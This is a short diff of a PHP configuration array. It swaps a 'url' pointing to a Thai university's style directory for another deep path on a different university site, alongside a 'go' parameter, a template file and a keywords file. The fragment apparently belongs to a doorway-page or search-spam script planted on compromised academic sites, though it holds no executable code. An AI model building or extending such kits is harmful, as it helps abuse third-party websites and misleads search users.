@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://itsc2.rsu.ac.th/police/style/',
+        'url'		=> 'https://agri.kps.ku.ac.th/News/newshilight/product/css/web/style/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
